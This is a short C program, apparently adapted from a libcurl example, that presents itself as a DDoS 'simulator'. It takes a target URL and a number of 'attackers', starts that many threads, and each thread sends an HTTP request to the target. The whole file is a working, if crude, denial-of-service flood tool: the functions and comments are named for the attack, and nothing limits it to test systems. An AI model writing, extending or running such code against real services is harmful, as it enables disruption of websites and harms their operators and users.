/*
Original implementation found here: https://curl.se/libcurl/c/https.html
Author: Iakovos Mastrogiannopoulos
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <curl/curl.h>

// A simple struct to send data from the main thread to the X thread
typedef struct thread_args {
  const char *url;
} thread_args;

// Thread function
void *ddos(void *_args) {
  // Parse arguments from main thread to X thread.
  thread_args *args = (thread_args *) _args;

  // Curl init
  CURL *curl;
  CURLcode res;

  curl = curl_easy_init();
  if (curl) {
    // Set attack
    curl_easy_setopt(curl, CURLOPT_URL, args->url);

    // Perform attack
    res = curl_easy_perform(curl);

    // If attack was successful, it skips this if
    if (res != CURLE_OK) {
      fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    }

    // Clean the CURL buffer
    curl_easy_cleanup(curl);
  }

  return NULL;
}

int main(int argc, char **argv) {
  if (argc != 3) {
    printf("The correct way to use the simulator is: ./ddos url num_of_attackers\n");
    exit(1);
  }

  unsigned int length = atoi(argv[2]); // Length of thread array

  // Arguments to take to the function
  thread_args *args = malloc(sizeof(thread_args));
  args->url = argv[1];

  // Thread initializer
  pthread_t *p_thread;
  p_thread = (pthread_t *)malloc(sizeof(pthread_t) * length);

  // Start of thread
  for (int i = 0; i < length; i++) {
    pthread_create(&p_thread[i] ,NULL, ddos, args);
  }

  // Thread join
  for (int i = 0; i < length; i++) {
    pthread_join(p_thread[i],NULL);
  }

  // Clearing the buffer
  free(p_thread);
  pthread_exit(NULL);
}
